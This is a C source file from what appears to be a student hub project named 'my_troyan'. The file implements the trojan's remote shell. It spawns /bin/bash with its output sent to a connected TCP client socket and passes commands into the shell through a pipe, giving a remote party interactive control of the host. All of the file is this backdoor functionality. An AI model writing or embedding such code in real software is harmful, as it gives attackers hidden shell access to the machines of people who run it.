/*
** EPITECH PROJECT, 2021
** HUB_my_troyan
** File description:
** 28/04/2021 shell_client.c
*/

#include "app.h"
#include <sys/wait.h>

int shell_client_init(socket_t *client, shell_t *shell)
{
    if (pipe(shell->pipe) == -1) {
        perror("pipe");
        return EXIT_FAILURE;
    }
    pid_t child_pid = fork();

    if (child_pid == -1) {
        return EXIT_FAILURE;
    } else if (child_pid == 0) {
        dup2(shell->pipe[0], 0);    // redirect pipe output to shell input
        close(1);
        dup(client->fd);            // redirect shell stdout to TCP client
        close(2);
        dup(client->fd);
        char *argv[] = {"/bin/bash", NULL};
        if (execve("/bin/bash", argv, NULL) == -1) {
            perror("execve");
            exit(EXIT_FAILURE);
        }
        exit(EXIT_SUCCESS);
    } else {
        close(shell->pipe[0]);
        shell->pid = child_pid;
    }
    return EXIT_SUCCESS;
}

int send_shell_command(shell_t *shell, const char *command)
{
    if (dprintf(shell->pipe[1], "%s\n", command) == -1) {
        return EXIT_FAILURE;
    }
    return EXIT_SUCCESS;
}

void shell_stop(shell_t *shell)
{
    if (shell->pid != -1) {
        send_shell_command(shell, "exit");
        close(shell->pipe[1]);
        fprintf(stderr, "Wait shell to stop\n"); // DEBUG
        waitpid(shell->pid, NULL, 0);
        fprintf(stderr, "shell stopped\n"); // DEBUG
        shell->pid = -1;
    } else {
        fprintf(stderr, "Err: shell not started\n"); // DEBUG
    }
}
